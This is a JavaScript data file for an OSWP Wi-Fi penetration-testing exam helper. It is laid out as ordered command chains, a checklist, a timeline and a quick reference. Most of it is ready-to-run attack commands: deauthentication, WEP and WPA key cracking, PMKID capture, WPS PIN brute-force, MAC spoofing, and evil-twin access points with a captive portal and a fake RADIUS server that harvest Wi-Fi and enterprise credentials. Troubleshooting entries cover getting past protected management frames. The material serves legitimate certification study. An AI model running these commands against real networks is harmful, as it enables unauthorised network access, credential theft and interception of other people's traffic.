const{useState,useEffect,useRef}=window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSWP AUTOPILOT v2 — PEN-210 Decision Engine 2026
// 3 Scenarios | Must crack 2 (1 mandatory) | 3h45m + 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── DATA: SETUP & RECON ───
const SETUP_CHAIN=[
{phase:"0. Interface Setup & Monitor Mode",desc:"Configure adapter BEFORE any attack.",steps:[
{action:"Kill interfering processes",cmd:(v)=>`sudo airmon-ng check kill\nsudo systemctl stop NetworkManager\nsudo systemctl stop wpa_supplicant`,check:"All processes killed?",critical:true},
{action:"Enable monitor mode",cmd:(v)=>`sudo airmon-ng start ${v.iface||"wlan0"}\niwconfig\n# Should show ${v.iface||"wlan0"}mon in Monitor mode`,check:"Monitor mode active?",critical:true},
{action:"Verify injection",cmd:(v)=>`sudo aireplay-ng --test ${v.iface||"wlan0"}mon\n# Should show: Injection is working!`,check:"Injection working?"},
{action:"Set channel",cmd:(v)=>`sudo iwconfig ${v.iface||"wlan0"}mon channel ${v.ch||"6"}`,check:"Locked to target channel?"},
]},
{phase:"1. Network Discovery & Recon",desc:"Identify ALL wireless networks, clients, encryption.",steps:[
{action:"Scan all networks",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon -w recon --output-format csv,pcap\n\n# Note for EACH network:\n# BSSID, ESSID, Channel, ENC, CIPHER, AUTH`,check:"All networks documented?",critical:true},
{action:"Lock onto target AP",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon --bssid ${v.bssid||"AA:BB:CC:DD:EE:FF"} -c ${v.ch||"6"} -w target_capture\n# Watch STATION column for connected clients`,check:"Clients visible? Note MACs!",critical:true},
{action:"Identify encryption type",cmd:(v)=>`# ENC column:\n#   OPN = Open | WEP = WEP | WPA/WPA2 = PSK\n# AUTH column:\n#   PSK = Pre-Shared Key\n#   MGT = Enterprise (RADIUS)\n#   SKA = Shared Key Auth (WEP)\n# CIPHER: CCMP = AES | TKIP = WPA | WEP = WEP`,check:"WEP→crack, WPA→handshake, MGT→evil twin"},
{action:"Passive sniffing (Wireshark)",cmd:(v)=>`sudo wireshark &\n# Select ${v.iface||"wlan0"}mon\n# Filters:\n# wlan.fc.type_subtype == 0x08  (Beacons)\n# wlan.fc.type_subtype == 0x04  (Probe Requests)\n# eapol                          (WPA Handshakes)\n# wlan.bssid == ${v.bssid||"AA:BB:CC:DD:EE:FF"}`,check:"Beacons + probe requests captured?"},
{action:"Bettercap recon",cmd:(v)=>`sudo bettercap -iface ${v.iface||"wlan0"}mon\n# In bettercap:\nwifi.recon on\nwifi.show\n# Lists all APs + clients with signal strength`,check:"Alternative to airodump-ng"},
{action:"Kismet passive recon",cmd:(v)=>`sudo kismet -c ${v.iface||"wlan0"}mon\n# Web UI: http://localhost:2501\n# Passive monitoring, no injection needed`,check:"Good for stealthy recon"},
]},
];

// ─── DATA: WEP ───
const WEP_CHAIN=[
{phase:"2. WEP Cracking (with Clients)",desc:"Deauth + ARP replay = fast crack. Need ~20k-40k IVs.",steps:[
{action:"Capture WEP traffic",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon --bssid ${v.bssid||"BSSID"} -c ${v.ch||"6"} -w wep_capture\n# Watch #Data column — need 20,000-40,000 IVs`,check:"IVs accumulating?",critical:true},
{action:"Fake authentication",cmd:(v)=>`sudo aireplay-ng -1 0 -a ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} -e "${v.essid||"NetworkName"}" ${v.iface||"wlan0"}mon\n\n# Keep-alive:\nsudo aireplay-ng -1 6000 -o 1 -q 10 -a ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} ${v.iface||"wlan0"}mon\n\n# Get your MAC: macchanger --show ${v.iface||"wlan0"}mon`,check:"Association successful?",critical:true},
{action:"ARP Request Replay",cmd:(v)=>`sudo aireplay-ng -3 -b ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} ${v.iface||"wlan0"}mon\n# Wait for ARP packet, then auto-replays\n# IVs should climb FAST (thousands/min)`,check:"IVs climbing fast?",critical:true},
{action:"Deauth client for ARP",cmd:(v)=>`sudo aireplay-ng -0 1 -a ${v.bssid||"BSSID"} -c ${v.client||"CLIENT_MAC"} ${v.iface||"wlan0"}mon\n# Client reconnects -> ARP -> replay captures it`,check:"ARP traffic started?"},
{action:"Crack WEP key",cmd:(v)=>`sudo aircrack-ng wep_capture-01.cap\n\n# PTW (faster, default):\nsudo aircrack-ng -z wep_capture-01.cap\n\n# FMS/KoreK (if PTW fails):\nsudo aircrack-ng -K wep_capture-01.cap`,check:"KEY FOUND? Format: XX:XX:XX:XX:XX",critical:true},
{action:"Connect & get flag",cmd:(v)=>`sudo airmon-ng stop ${v.iface||"wlan0"}mon\niwconfig ${v.iface||"wlan0"} essid "${v.essid||"NetworkName"}" key s:PASSWORD\ndhclient ${v.iface||"wlan0"}\n\n# GET THE FLAG:\ncat /root/proof.txt\n# SCREENSHOT: ifconfig + proof.txt`,check:"Connected? Got proof.txt?",critical:true},
]},
{phase:"3. WEP — Clientless (ChopChop/Frag)",desc:"No clients? Forge packets with keystream.",steps:[
{action:"Fake auth",cmd:(v)=>`sudo aireplay-ng -1 0 -a ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} -e "${v.essid||"NetworkName"}" ${v.iface||"wlan0"}mon`,check:"Association OK?",critical:true},
{action:"ChopChop attack",cmd:(v)=>`sudo aireplay-ng -4 -b ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} ${v.iface||"wlan0"}mon\n# Answer 'y' to use packet -> produces .xor file`,check:"Got .xor keystream?",critical:true},
{action:"Fragmentation (alt)",cmd:(v)=>`sudo aireplay-ng -5 -b ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} ${v.iface||"wlan0"}mon\n# Also produces .xor keystream`,check:"Try if ChopChop fails"},
{action:"Forge ARP packet",cmd:(v)=>`sudo packetforge-ng -0 -a ${v.bssid||"BSSID"} -h ${v.cmac||"YOUR_MAC"} -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w forged_arp.cap`,check:"Forged ARP created?",critical:true},
{action:"Replay forged + crack",cmd:(v)=>`sudo aireplay-ng -2 -r forged_arp.cap ${v.iface||"wlan0"}mon\n# Wait for IVs...\nsudo aircrack-ng wep_capture-01.cap`,check:"KEY FOUND?",critical:true},
]},
];

// ─── DATA: WPA/WPA2 ───
const WPA_CHAIN=[
{phase:"4. WPA/WPA2 PSK — Capture Handshake",desc:"Capture 4-way EAPOL handshake then crack offline.",steps:[
{action:"Start targeted capture",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon --bssid ${v.bssid||"BSSID"} -c ${v.ch||"6"} -w wpa_capture\n# Watch top-right for: "WPA handshake: ${v.bssid||"BSSID"}"`,check:"Capturing? Clients visible?",critical:true},
{action:"Deauth to force handshake",cmd:(v)=>`# Deauth specific client:\nsudo aireplay-ng -0 5 -a ${v.bssid||"BSSID"} -c ${v.client||"CLIENT_MAC"} ${v.iface||"wlan0"}mon\n\n# Deauth ALL clients:\nsudo aireplay-ng -0 5 -a ${v.bssid||"BSSID"} ${v.iface||"wlan0"}mon\n\n# KEEP airodump running in other terminal!`,check:"WPA handshake captured?",critical:true},
{action:"Verify handshake",cmd:(v)=>`sudo aircrack-ng wpa_capture-01.cap\n# Should show "1 handshake"\n\n# Wireshark: filter 'eapol'\n# Need: Messages 1+2 or 2+3 minimum`,check:"Handshake confirmed in file?",critical:true},
{action:"PMKID attack (no client needed)",cmd:(v)=>`sudo hcxdumptool -i ${v.iface||"wlan0"}mon --enable_status=1 -o pmkid.pcapng\nhcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng\nhashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt`,check:"PMKID captured? No deauth needed!"},
]},
{phase:"5. WPA/WPA2 PSK — Crack the Key",desc:"Offline dictionary attack. Wordlist is everything.",steps:[
{action:"aircrack-ng",cmd:(v)=>`sudo aircrack-ng wpa_capture-01.cap -w /usr/share/wordlists/rockyou.txt -b ${v.bssid||"BSSID"}`,check:"KEY FOUND?",critical:true},
{action:"hashcat (GPU)",cmd:(v)=>`hcxpcapngtool -o wpa_hash.hc22000 wpa_capture-01.cap\nhashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt\n\n# With rules:\nhashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`,check:"GPU = much faster",critical:true},
{action:"John the Ripper",cmd:(v)=>`aircrack-ng wpa_capture-01.cap -J wpa_john\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules wpa_john.hccap`,check:"Alternative cracker"},
{action:"coWPAtty + rainbow tables",cmd:(v)=>`cowpatty -f /usr/share/wordlists/rockyou.txt -r wpa_capture-01.cap -s "${v.essid||"NetworkName"}"\n\n# Pre-compute PMKs (fast):\ngenpmk -f /usr/share/wordlists/rockyou.txt -d pmk_table -s "${v.essid||"NetworkName"}"\ncowpatty -d pmk_table -r wpa_capture-01.cap -s "${v.essid||"NetworkName"}"`,check:"Rainbow tables = very fast"},
{action:"Custom wordlist",cmd:(v)=>`# CeWL from related site:\ncewl http://company-site.com -d 3 -m 4 -w custom.txt\n\n# Crunch patterns:\ncrunch 8 12 -t @@@@%%%% -o patterns.txt\ncrunch 8 8 0123456789 -o numeric8.txt\n\n# Combine:\ncat /usr/share/wordlists/rockyou.txt custom.txt | sort -u > combined.txt`,check:"Context-specific wordlists!"},
{action:"Connect & get flag",cmd:(v)=>`sudo airmon-ng stop ${v.iface||"wlan0"}mon\nwpa_passphrase "${v.essid||"NetworkName"}" "CrackedPassword" > /tmp/wpa.conf\nsudo wpa_supplicant -B -i ${v.iface||"wlan0"} -c /tmp/wpa.conf\nsudo dhclient ${v.iface||"wlan0"}\n\n# VERIFY + FLAG:\niwconfig ${v.iface||"wlan0"}\nip a show ${v.iface||"wlan0"}\ncat /root/proof.txt\n# SCREENSHOT EVERYTHING`,check:"Connected? proof.txt?",critical:true},
]},
];

// ─── DATA: ROGUE AP ───
const ROGUE_CHAIN=[
{phase:"6. Evil Twin — hostapd Rogue AP",desc:"Fake AP mirrors target. Clients connect to you.",steps:[
{action:"Create hostapd config",cmd:(v)=>`cat > /tmp/evil.conf << 'EOF'\ninterface=${v.iface||"wlan0"}\ndriver=nl80211\nssid=${v.essid||"TargetNetwork"}\nhw_mode=g\nchannel=${v.ch||"6"}\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nEOF`,check:"Config matches target SSID+Channel?",critical:true},
{action:"Start rogue AP",cmd:(v)=>`sudo airmon-ng stop ${v.iface||"wlan0"}mon\nsudo hostapd /tmp/evil.conf`,check:"AP broadcasting?",critical:true},
{action:"Set up DHCP + routing",cmd:(v)=>`sudo ifconfig ${v.iface||"wlan0"} 10.0.0.1 netmask 255.255.255.0 up\n\ncat > /tmp/dnsmasq.conf << 'EOF'\ninterface=${v.iface||"wlan0"}\ndhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\naddress=/#/10.0.0.1\nEOF\n\nsudo dnsmasq -C /tmp/dnsmasq.conf\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`,check:"DHCP running? Clients getting IPs?"},
{action:"Deauth from real AP",cmd:(v)=>`# NEED 2nd adapter for deauth!\nsudo aireplay-ng -0 0 -a ${v.bssid||"REAL_AP_BSSID"} ${v.iface||"wlan0"}mon`,check:"Clients reconnecting to you?",critical:true},
{action:"Capture traffic",cmd:(v)=>`sudo tcpdump -i ${v.iface||"wlan0"} -w evil_capture.pcap\nsudo tcpdump -i ${v.iface||"wlan0"} -A | grep -iE '(user|pass|login)'`,check:"Credentials captured?"},
]},
{phase:"7. Captive Portal Attack",desc:"Serve fake login page to harvest Wi-Fi passwords.",steps:[
{action:"Create portal + web server",cmd:(v)=>`mkdir -p /tmp/portal\n# Create login page and PHP handler\nsudo php -S 10.0.0.1:80 -t /tmp/portal/`,check:"Web server on port 80?"},
{action:"DNS redirect to portal",cmd:(v)=>`# dnsmasq address=/#/10.0.0.1 already set\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80\nsudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80`,check:"All HTTP redirected?"},
{action:"Monitor creds",cmd:(v)=>`tail -f /tmp/captured_creds.txt`,check:"Passwords coming in?",critical:true},
]},
];

// ─── DATA: ENTERPRISE ───
const ENTERPRISE_CHAIN=[
{phase:"8. WPA Enterprise — RADIUS Evil Twin",desc:"Fake RADIUS server captures EAP credentials.",steps:[
{action:"Identify Enterprise (AUTH=MGT)",cmd:(v)=>`# In airodump-ng: AUTH = MGT\n# Clients use username/password (not PSK)`,check:"AUTH=MGT confirmed?",critical:true},
{action:"hostapd-wpe setup",cmd:(v)=>`sudo apt install hostapd-wpe\n# Edit: /etc/hostapd-wpe/hostapd-wpe.conf\n# Set: interface=${v.iface||"wlan0"}\n# Set: ssid=${v.essid||"CorpWifi"}\n# Set: channel=${v.ch||"6"}\n\nsudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf`,check:"Broadcasting enterprise SSID?",critical:true},
{action:"Capture EAP creds",cmd:(v)=>`# hostapd-wpe auto-captures:\n# - MS-CHAPv2 challenge/response\n# - PEAP credentials\n# - EAP-TTLS credentials\ncat /tmp/hostapd-wpe.log`,check:"Username + challenge/response?",critical:true},
{action:"Crack captured hashes",cmd:(v)=>`# hashcat (NetNTLMv1):\nhashcat -m 5500 enterprise_hash.txt /usr/share/wordlists/rockyou.txt\n\n# asleap:\nasleap -C CHALLENGE -R RESPONSE -W /usr/share/wordlists/rockyou.txt`,check:"Password cracked?",critical:true},
{action:"Connect to real network",cmd:(v)=>`cat > /tmp/wpa_ent.conf << 'EOF'\nnetwork={\n  ssid="${v.essid||"CorpWifi"}"\n  key_mgmt=WPA-EAP\n  eap=PEAP\n  identity="crackeduser"\n  password="CrackedPassword"\n  phase2="auth=MSCHAPV2"\n}\nEOF\nsudo wpa_supplicant -B -i ${v.iface||"wlan0"} -c /tmp/wpa_ent.conf\nsudo dhclient ${v.iface||"wlan0"}`,check:"Connected with cracked creds?"},
]},
];

// ─── DATA: WPS ───
const WPS_CHAIN=[
{phase:"9. WPS PIN Attacks",desc:"WPS design flaw — brute-force the 8-digit PIN.",steps:[
{action:"Detect WPS-enabled APs",cmd:(v)=>`sudo wash -i ${v.iface||"wlan0"}mon\n# Or:\nsudo airodump-ng ${v.iface||"wlan0"}mon --wps\n# Look for: Locked = No, Version 1.0`,check:"WPS enabled + not locked?",critical:true},
{action:"Reaver brute-force",cmd:(v)=>`sudo reaver -i ${v.iface||"wlan0"}mon -b ${v.bssid||"BSSID"} -c ${v.ch||"6"} -vv\n\n# With delay:\nsudo reaver -i ${v.iface||"wlan0"}mon -b ${v.bssid||"BSSID"} -c ${v.ch||"6"} -vv -d 2 -t 5\n\n# Pixie Dust (MUCH faster):\nsudo reaver -i ${v.iface||"wlan0"}mon -b ${v.bssid||"BSSID"} -c ${v.ch||"6"} -vv -K 1`,check:"PIN + WPA PSK found?",critical:true},
{action:"Bully (alternative)",cmd:(v)=>`sudo bully ${v.iface||"wlan0"}mon -b ${v.bssid||"BSSID"} -c ${v.ch||"6"} -d -v 3`,check:"Try if Reaver fails"},
]},
];

// ─── DATA: EXTRA ───
const EXTRA_CHAIN=[
{phase:"10. MAC Filtering Bypass",desc:"Spoof whitelisted client MAC.",steps:[
{action:"Find allowed MACs",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon --bssid ${v.bssid||"BSSID"} -c ${v.ch||"6"}\n# STATION column = whitelisted MACs`,check:"Client MACs visible?",critical:true},
{action:"Spoof MAC",cmd:(v)=>`sudo airmon-ng stop ${v.iface||"wlan0"}mon\nsudo ifconfig ${v.iface||"wlan0"} down\nsudo macchanger -m ${v.client||"CLIENT_MAC"} ${v.iface||"wlan0"}\nsudo ifconfig ${v.iface||"wlan0"} up\nsudo airmon-ng start ${v.iface||"wlan0"}`,check:"MAC changed?"},
]},
{phase:"11. Hidden SSID Discovery",desc:"Reveal hidden networks via deauth.",steps:[
{action:"Detect hidden network",cmd:(v)=>`sudo airodump-ng ${v.iface||"wlan0"}mon\n# Hidden = blank ESSID or <length: X>`,check:"Hidden SSID? BSSID visible?",critical:true},
{action:"Reveal via deauth",cmd:(v)=>`sudo aireplay-ng -0 5 -a ${v.bssid||"BSSID"} -c ${v.client||"CLIENT_MAC"} ${v.iface||"wlan0"}mon\n# Watch airodump — SSID appears on reconnect`,check:"SSID revealed?"},
]},
{phase:"12. Decrypt Captured Traffic",desc:"After cracking, decrypt the .cap file to read data.",steps:[
{action:"airdecap-ng (WEP)",cmd:(v)=>`airdecap-ng -w HEXKEY wep_capture-01.cap\n# Creates wep_capture-01-dec.cap`,check:"Decrypted cap created?"},
{action:"airdecap-ng (WPA)",cmd:(v)=>`airdecap-ng -p "CrackedPassword" -e "${v.essid||"NetworkName"}" wpa_capture-01.cap\n# Open in Wireshark to read traffic`,check:"Can read HTTP/DNS/etc?"},
]},
];

// ─── CHECKLIST ───
const CHECKLIST={
"Network 1 (Mandatory)":[
"Identified encryption type (WEP/WPA/WPA2/Enterprise)","Documented BSSID, ESSID, Channel, CIPHER, AUTH",
"Attack vector selected and executed","Key/password cracked successfully",
"Connected to network (wpa_supplicant or iwconfig)","Retrieved proof.txt flag",
"Screenshot: ifconfig + proof.txt + cracked key","All commands + output documented",
],
"Network 2 (Choose 1 of 2)":[
"Identified encryption type","Documented BSSID, ESSID, Channel, CIPHER, AUTH",
"Attack vector selected and executed","Key/password cracked successfully",
"Connected to network","Retrieved proof.txt flag",
"Screenshot: ifconfig + proof.txt + cracked key","All commands + output documented",
],
"Network 3 (Backup)":[
"Identified encryption type","Attack vector selected","Key cracked",
"Connected + proof.txt","Documented",
],
"Report & Submission":[
"Report covers at least 2 cracked networks","Each step: command + output + screenshot",
"Proof screenshots show connection + flag","Report in PDF format, archived as .7z",
"Submitted within 24 hours",
],
};

// ─── MILESTONES ───
const MILESTONES=[
{hour:0,label:"START — Kill processes, monitor mode, scan ALL networks."},
{hour:0.25,label:"All networks identified. Note encryption. Pick mandatory first."},
{hour:0.5,label:"Attack on Network 1 (mandatory) underway."},
{hour:1.0,label:"Network 1 should be cracked or nearly done."},
{hour:1.5,label:"TARGET: Network 1 DONE. Connect + proof.txt. Start Network 2."},
{hour:2.0,label:"Network 2 attack in progress. If stuck, try Network 3."},
{hour:2.5,label:"Network 2 should be cracked. You need 2 of 3 to pass."},
{hour:3.0,label:"Both done? Attack Network 3. Document everything."},
{hour:3.5,label:"FINAL 15min — Verify all screenshots and proof captured."},
{hour:3.75,label:"EXAM ENDS — Begin writing report (24h deadline)."},
];

// ─── QUICK REF ───
const QUICK_REF={
"Monitor Mode":[
{l:"Start monitor",c:"sudo airmon-ng start wlan0"},{l:"Stop monitor",c:"sudo airmon-ng stop wlan0mon"},
{l:"Kill interfering",c:"sudo airmon-ng check kill"},{l:"Check interfaces",c:"iwconfig"},
],
"Scanning":[
{l:"Scan all",c:"sudo airodump-ng wlan0mon"},{l:"Target AP",c:"sudo airodump-ng wlan0mon --bssid BSSID -c CH -w capture"},
{l:"WPS scan",c:"sudo wash -i wlan0mon"},{l:"Bettercap scan",c:"sudo bettercap -iface wlan0mon"},
],
"Deauthentication":[
{l:"Deauth client",c:"sudo aireplay-ng -0 5 -a AP_BSSID -c CLIENT wlan0mon"},
{l:"Deauth all",c:"sudo aireplay-ng -0 5 -a AP_BSSID wlan0mon"},
{l:"Continuous",c:"sudo aireplay-ng -0 0 -a AP_BSSID wlan0mon"},
],
"WEP":[
{l:"Fake auth",c:"sudo aireplay-ng -1 0 -a BSSID -h MAC wlan0mon"},
{l:"ARP replay",c:"sudo aireplay-ng -3 -b BSSID -h MAC wlan0mon"},
{l:"ChopChop",c:"sudo aireplay-ng -4 -b BSSID -h MAC wlan0mon"},
{l:"Fragmentation",c:"sudo aireplay-ng -5 -b BSSID -h MAC wlan0mon"},
{l:"Forge ARP",c:"packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap"},
{l:"Crack WEP",c:"sudo aircrack-ng capture.cap"},
],
"WPA/WPA2":[
{l:"Crack handshake",c:"sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt"},
{l:"Hashcat WPA",c:"hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt"},
{l:"Hashcat + rules",c:"hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule"},
{l:"PMKID capture",c:"sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng"},
{l:"PMKID convert",c:"hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng"},
{l:"Hashcat modes",c:"# 22000 = WPA/WPA2/PMKID (new)\n# 2500 = WPA/WPA2 (legacy)\n# 16800 = PMKID (legacy)"},
{l:"Convert to hashcat",c:"hcxpcapngtool -o hash.hc22000 capture.cap"},
{l:"coWPAtty",c:"cowpatty -f wordlist.txt -r capture.cap -s ESSID"},
{l:"Decrypt traffic",c:"airdecap-ng -p 'password' -e 'ESSID' capture.cap"},
],
"Wireshark 802.11 Filters":[
{l:"Beacons",c:"wlan.fc.type_subtype == 0x08"},
{l:"Probe Requests",c:"wlan.fc.type_subtype == 0x04"},
{l:"Probe Responses",c:"wlan.fc.type_subtype == 0x05"},
{l:"EAPOL (Handshake)",c:"eapol"},
{l:"Filter by AP",c:"wlan.bssid == AA:BB:CC:DD:EE:FF"},
{l:"Deauth frames",c:"wlan.fc.type_subtype == 0x0c"},
{l:"Data frames only",c:"wlan.fc.type == 2"},
],
"MAC & Connection":[
{l:"Show MAC",c:"macchanger --show wlan0"},
{l:"Random MAC",c:"sudo macchanger -r wlan0"},
{l:"Set MAC",c:"sudo macchanger -m XX:XX:XX:XX:XX:XX wlan0"},
{l:"WPA connect",c:'wpa_passphrase "SSID" "pass" > wpa.conf && sudo wpa_supplicant -B -i wlan0 -c wpa.conf && sudo dhclient wlan0'},
{l:"WEP connect",c:'iwconfig wlan0 essid "SSID" key s:PASSWORD && dhclient wlan0'},
],
};

// ─── TROUBLESHOOTING ───
const TROUBLESHOOT=[
{q:"Monitor mode won't start",a:`sudo airmon-ng check kill\nsudo rfkill unblock all\nsudo airmon-ng start wlan0\n\n# If still fails, try manual:\nsudo ip link set wlan0 down\nsudo iw dev wlan0 set type monitor\nsudo ip link set wlan0 up`},
{q:"Injection not working",a:`sudo aireplay-ng --test wlan0mon\n\n# Try different driver:\nsudo modprobe -r ath9k_htc && sudo modprobe ath9k_htc\n\n# Check USB adapter is recognized:\nlsusb\ndmesg | tail -20`},
{q:"Deauth blocked by PMF (802.11w)",a:`# Protected Management Frames (PMF/802.11w) prevents deauth attacks.\n# Options:\n# 1. Use PMKID attack instead (no deauth needed!):\nsudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng\n\n# 2. Wait for client to naturally reconnect\n# 3. Try channel-based disruption (flood channel)\n# 4. Some older clients don't support PMF — target those`},
{q:"No handshake captured",a:`# 1. Make sure client is connected (check STATION column)\n# 2. Try more aggressive deauth:\nsudo aireplay-ng -0 10 -a BSSID wlan0mon\n# 3. Try deauthing specific client\n# 4. Try PMKID attack (no client needed):\nsudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng`},
{q:"aircrack-ng won't crack",a:`# 1. Verify handshake is complete:\naircrack-ng capture.cap\n# Must show \"1 handshake\"\n\n# 2. Try bigger wordlists:\n/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt\n\n# 3. Use hashcat with rules:\nhcxpcapngtool -o hash.hc22000 capture.cap\nhashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule`},
{q:"Fake auth keeps failing (WEP)",a:`# 1. Try with specific auth:\nsudo aireplay-ng -1 0 -a BSSID -h YOUR_MAC -e "ESSID" wlan0mon\n\n# 2. MAC filtering? Spoof client MAC:\nsudo macchanger -m CLIENT_MAC wlan0mon\n\n# 3. Try SKA auth:\nsudo aireplay-ng -1 0 -a BSSID -h YOUR_MAC -e "ESSID" -y keystream.xor wlan0mon`},
{q:"hostapd won't start",a:`# 1. Stop monitor mode first:\nsudo airmon-ng stop wlan0mon\n\n# 2. Kill conflicting:\nsudo airmon-ng check kill\n\n# 3. Check config syntax:\nsudo hostapd -dd /tmp/evil.conf\n\n# 4. Try different driver:\n# Change driver=nl80211 to driver=rtl871xdrv`},
{q:"Can't connect after cracking",a:`# 1. Stop monitor mode:\nsudo airmon-ng stop wlan0mon\n\n# 2. Restart NetworkManager:\nsudo systemctl start NetworkManager\n\n# 3. Manual connect:\nwpa_passphrase "SSID" "password" > /tmp/wpa.conf\nsudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf\nsudo dhclient wlan0\n\n# 4. Check:\niwconfig wlan0\nip a show wlan0\nping -c 2 8.8.8.8`},
];

// ━━━ CSS ━━━
const CSS=`
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#06b6d4;--acd:rgba(6,182,212,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--rd:rgba(239,68,68,0.08);--y:#eab308;--b:#3b82f6;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#06b6d4,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.inps{display:flex;gap:4px;flex-wrap:wrap}
.inp{background:var(--b0);border:1px solid var(--bd);border-radius:4px;padding:5px 7px;color:var(--t0);font-size:10px;font-family:var(--m);outline:none;width:110px;transition:border .2s}
.inp:focus{border-color:var(--ac)}.inp::placeholder{color:var(--t2)}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
